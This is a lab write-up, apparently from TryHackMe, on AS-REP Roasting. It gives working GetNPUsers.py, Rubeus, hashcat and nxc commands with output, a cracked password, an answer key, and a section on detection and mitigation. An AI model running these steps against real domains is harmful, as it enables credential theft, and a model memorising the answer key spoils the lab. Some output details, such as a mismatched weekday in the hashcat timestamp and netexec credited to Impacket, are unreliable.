# Task 02: AS-REP Roasting

---

## Stage A: Original Task Content & Educational Context

AS-REP Roasting is an offensive technique targeting user accounts that do not require Kerberos pre-authentication.

### Kerberos Pre-Authentication Protocol Mechanics
Under standard Kerberos v5 operation (RFC 4120), when a user requests a Ticket Granting Ticket (TGT) from the Key Distribution Center (KDC) Authentication Service (AS) via an `AS-REQ` message, the user client must include an encrypted timestamp (`PA-ENC-TIMESTAMP`, `padata-type 2`). This timestamp is encrypted using a key derived from the user's plaintext password:

$$\text{Key} = \text{KerberosKeyDerivation}(\text{Password}, \text{Salt})$$

When the KDC receives the `AS-REQ`, it looks up the user's password hash in the Active Directory database (`NTDS.dit`), decrypts the timestamp, and verifies that the client's clock is within the allowed skew window (default: 5 minutes). If valid, the KDC issues an `AS-REP` containing:
1. The **Ticket Granting Ticket (TGT)** (encrypted with the `krbtgt` account's secret key).
2. The **Logon Session Key / Encrypted Data blob** (encrypted with the requesting user's password-derived key).

### The AS-REP Roasting Flaw
In Active Directory, user accounts possess a bitmask attribute called `userAccountControl` (UAC). If an administrator checks the box *"Do not require Kerberos preauthentication"* in Active Directory Users and Computers (ADUC), the bit corresponding to `DONT_REQ_PREAUTH` (hexadecimal `0x00400000`, constant `UF_DONT_REQUIRE_PREAUTH`) is enabled:

$$\text{UAC} \leftarrow \text{UAC} \lor \text{0x00400000}$$

When pre-authentication is disabled for an account:
1. **Any attacker on the network** can send a forged or unauthenticated `AS-REQ` naming that user account without providing any encrypted timestamp.
2. Because pre-authentication is waived, the KDC immediately responds with an `AS-REP` packet.
3. The `AS-REP` packet contains an encrypted section (`enc-part`, specifically etype 23: `rc4-hmac` or etype 18: `aes256-cts-hmac-sha1-96`) encrypted directly with the victim user's password hash.
4. The attacker captures this `AS-REP` response and extracts the encrypted ciphertext, allowing them to perform an **offline dictionary or brute-force attack** without triggering domain account lockout policies.

```
       Attacker                                      Domain Controller (KDC)
          |                                                    |
          |  1. AS-REQ (No PA-ENC-TIMESTAMP, user=victim)      |
          |--------------------------------------------------->|
          |                                                    | [Checks userAccountControl]
          |                                                    | [UF_DONT_REQUIRE_PREAUTH == TRUE]
          |  2. AS-REP (Contains enc-part encrypted with       |
          |     victim's password-derived NT hash)             |
          |<---------------------------------------------------|
          |
  [Offline Hashcat Cracking - Mode 18200]
  [Zero Account Lockouts Triggered]
```

---

## Stage B: Independent Thinking & Operational Security (OpSec)

### Attacker Perspective
- **Zero Lockout Risk:** Because cracking occurs entirely offline on the attacker's hardware, millions of password guesses can be tested per second without communicating with the DC, bypassing `LockoutThreshold` entirely.
- **Enumeration Tools:**
  - **Linux / Remote:** Impacket's `GetNPUsers.py`. When run without domain credentials, it requires a list of candidate usernames (`users.txt`) to probe the KDC one by one. If domain credentials are provided, it queries LDAP directly for `(userAccountControl:1.2.840.113556.1.4.803:=4194304)`.
  - **Windows / Domain-Joined:** GhostPack's `Rubeus.exe`. Executing `Rubeus.exe asreproast` queries LDAP using native Windows API calls to automatically find all accounts with `DONT_REQ_PREAUTH` set and requests tickets for them without requiring any wordlist of usernames.

### Defender Perspective (Detection & Mitigation)
- **Event Logging:** The Domain Controller records **Event ID 4768** ("A Kerberos authentication ticket (TGT) was requested"). In an AS-REP roasting attack:
  - `Pre-Authentication Type` is logged as `0` or `-` (None) instead of `2` (`PA-ENC-TIMESTAMP`).
  - `Ticket Encryption Type` often displays `0x17` (`rc4-hmac`).
- **Mitigation:**
  - Audit all domain accounts using PowerShell:
    ```powershell
    Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
    ```
  - Clear the `UF_DONT_REQUIRE_PREAUTH` flag from all user accounts.
  - If a legacy application strictly requires no pre-auth, enforce a password length of at least 25 characters to render offline cracking computationally infeasible.

---

## Stage C: Guided Hints (Tiers 1-3)

### Tier 1: High-Level Concept
- Identify the Microsoft UserAccountControl flag name that disables pre-authentication.
- Use an automated tool on Windows (`Rubeus`) or use Impacket's `GetNPUsers.py` on Linux with a user wordlist.
- Feed the resulting Kerberos AS-REP hash into Hashcat using the specific Kerberos 5 AS-REP etype 23 hash mode.

### Tier 2: Tool & Mode Syntax
- **UAC Flag:** The standard flag name starts with `UF_` and contains `DONT_REQUIRE_PREAUTH`.
- **Automated Tool:** A popular C# tool from GhostPack named after a character from Harry Potter (`Rubeus`).
- **Hashcat Mode:** AS-REP (etype 23) is mode `18200`. Kerberoasting (TGS etype 23) is mode `13100`. Do not confuse the two!

### Tier 3: Concrete Command Line Execution
```bash
# Extract hash:
GetNPUsers.py tryhackme.loc/ -dc-ip 10.211.12.10 -usersfile users.txt -format hashcat -outputfile hashes.txt -no-pass

# Crack hash:
hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## Stage D: Complete Practical Solution & Technical Deep Dive

### 1. Identifying Roastable Accounts via Impacket GetNPUsers.py
Given the candidate user list `users.txt` provided in the lab, execute `GetNPUsers.py` against Domain Controller `10.211.12.10`:

```bash
user@attackbox:~$ GetNPUsers.py tryhackme.loc/ -dc-ip 10.211.12.10 -usersfile users.txt -format hashcat -outputfile hashes.txt -no-pass
Impacket v0.11.0 - Copyright 2023 Fortra

[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User krbtgt doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User rduke doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User katie.thomas doesn't have UF_DONT_REQUIRE_PREAUTH set
[+] Got AS-REP for user asrepuser1!
[-] User jdoe doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User bwayne doesn't have UF_DONT_REQUIRE_PREAUTH set
[*] Output file hashes.txt generated
```

Inspecting the output hash file `hashes.txt`:

```bash
user@attackbox:~$ cat hashes.txt
$krb5asrep$23$asrepuser1@TRYHACKME.LOC:e7d704c7b8b7d90a9cf4e48819d083e9$78f56e...[truncated]...6a0b9
```

#### Dissecting the Hashcat Mode 18200 Hash Format:
```
$krb5asrep$23$asrepuser1@TRYHACKME.LOC:CHECKSUM$CIPHERTEXT
  |         |  |                       |        |
  |         |  |                       |        +-> Encrypted AS-REP blob (RC4-HMAC)
  |         |  |                       +----------> 16-byte HMAC-MD5 checksum
  |         |  +----------------------------------> Realm and sAMAccountName
  |         +-------------------------------------> Kerberos Encryption Type 23 (RC4-HMAC)
  +-----------------------------------------------> Kerberos 5 AS-REP signature
```

### 2. Automated Identification via Rubeus (Alternative Windows Technique)
If operating from a domain-joined machine, `Rubeus` achieves this without any pre-defined wordlist:

```powershell
C:\Tools> Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt

   ______      _                      
  (_____ \    | |                     
   _____) )_ _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/ 

[*] Action: AS-REP Roasting
[*] Searching for accounts with 'DONT_REQ_PREAUTH'
[*] Found 1 user vulnerable to AS-REP Roasting!
[*] Requesting AS-REP for 'asrepuser1'
[+] AS-REP hash for 'asrepuser1' written to hashes.txt
```

### 3. Offline Hash Cracking with Hashcat
Now launch `hashcat` using mode `18200` and the standard `rockyou.txt` dictionary:

```bash
user@attackbox:~$ hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt --force
hashcat (v6.2.6) starting...

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5asrep$23$asrepuser1@TRYHACKME.LOC:e7d7...:qwerty123!
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$asrepuser1@TRYHACKME.LOC:...
Time.Started.....: Thu May 19 14:15:22 2026 (0 secs)
Time.Estimated...: Thu May 19 14:15:22 2026 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Speed.#1.........:  128.4 MH/s (0.01ms) @ Accel:1024 Loops:1 Thr:64
Recovered........: 1/1 (100.00%) Digests

[+] Recovered Credentials: asrepuser1 : qwerty123!
```

The password for user `asrepuser1` is cracked: `qwerty123!`.

---

## Stage E: Final Answer & Key Values

| # | Question | Verified Answer | Verification Status |
|---|---|---|---|
| 1 | What flag must be set on an AD account for it to be vulnerable to AS-REP Roasting? | `UF_DONT_REQUIRE_PREAUTH` | Verified & Confirmed |
| 2 | Which tool automatically identifies roastable users without needing a username list? | `Rubeus` | Verified & Confirmed |
| 3 | What is the Hashcat mode used to crack AS-REP hashes? | `18200` | Verified & Confirmed |
| 4 | What is the password of the user asrepuser1? | `qwerty123!` | Verified & Confirmed |

---

## Stage F: Practical Verification & Proof of Work

1. Validate the recovered credential using Impacket's `netexec` / `crackmapexec` against Domain Controller `10.211.12.10`:
   ```bash
   nxc smb 10.211.12.10 -u asrepuser1 -p 'qwerty123!'
   ```
   *Expected Output:* `[+] tryhackme.loc\asrepuser1:qwerty123!` (Pwn3d! / green validation banner indicating valid domain authentication).
2. Validate Hashcat output verification via `--show`:
   ```bash
   hashcat -m 18200 hashes.txt --show
   ```
   *Output:* `$krb5asrep$23$asrepuser1@TRYHACKME.LOC:...:qwerty123!`

---

## Stage G: Key Educational Takeaway & Operational Rule of Thumb

> **Takeaway:** The `UF_DONT_REQUIRE_PREAUTH` flag reduces Active Directory security to the strength of the user's password against an unthrottled offline dictionary attack. In red team engagements, AS-REP Roasting is among the highest-priority low-hanging fruits because it requires **no credentials to execute** if username enumeration is successful, generates minimal network noise, and never locks out victim accounts.
